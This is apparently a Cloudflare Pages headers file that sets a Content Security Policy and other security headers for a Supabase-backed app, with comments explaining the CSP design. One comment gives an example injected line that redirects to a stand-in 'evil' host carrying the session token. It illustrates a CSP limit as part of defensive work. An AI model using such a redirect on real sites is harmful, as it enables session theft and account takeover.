# E6.7 - security headers for the Pages deployment.
#
# WHAT THIS DOES. As of E13.1 (2026-09-01) script-src has NO 'unsafe-inline', so the browser will
# not run script that was injected into the page at all. That is the difference between an escaping
# slip being account takeover - the Supabase session token is in localStorage - and being a
# cosmetic glitch. Escaping at the sink (esc(), in app.js) is still the actual fix; this is the
# layer that makes a miss survivable.
#
# HOW IT IS POSSIBLE. The application moved to app.js, covered by 'self'. Three small blocks remain
# inline because they must run before first paint - the Turnstile callback, the Capacitor native
# check, and the one that keeps the sign-in gate up - and each is named by sha256 below. They
# almost never change; the file that changes on every edit is not hashed, deliberately, because a
# stale hash does not degrade the app, it BLANKS it. tools/csp_hashes.py computes them and
# check_syntax.py fails when they drift, so that failure lands in CI and not on the live site.
#
# Still worth being honest about: CSP cannot block top-level navigation, so a successful injection
# could still do location = "https://evil/?t=" + token. This is a high bar, not a wall.

/*
  # challenges.cloudflare.com is Turnstile. BOTH the apex and *.challenges.cloudflare.com are
  # needed: the widget loads from the apex, but the interactive challenge talks to a per-region
  # subdomain (hagen.challenges.cloudflare.com and friends), and a CSP wildcard does not match
  # the apex nor the apex the subdomains. Allowing only the apex looked fine - the widget even
  # rendered - and then silently produced no token, because the one blocked request was the one
  # that solves the challenge. Verified by fetching both hosts from the live page.
  # Its script, the iframe it draws the widget in, and
  # the callback it posts the solved token to. Three directives, one host, nothing wider. This is
  # a deliberate widening of connect-src, which exists to stop XSS reaching an attacker - so it is
  # worth being explicit that the trade is: bot protection on signup, for one more allowed origin.
  Content-Security-Policy: default-src 'self'; script-src 'self' https://challenges.cloudflare.com https://*.challenges.cloudflare.com 'sha256-yW2dx/BrUS1eioRToG8MKaslFiJGcdv6GNEdpzZ5Tpo=' 'sha256-0GuVWcLZKV7QR4X/RVtYdXsKWkcUbazFtDYijulYWEQ=' 'sha256-ULF0qw3npDeazeNiw8gPxGGLGGW7YyaictdVxOXUQOc='; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self' https://uvzxdeiiwswhthfaqhtb.supabase.co https://challenges.cloudflare.com https://*.challenges.cloudflare.com; frame-src https://challenges.cloudflare.com https://*.challenges.cloudflare.com; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests
  X-Frame-Options: DENY
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()
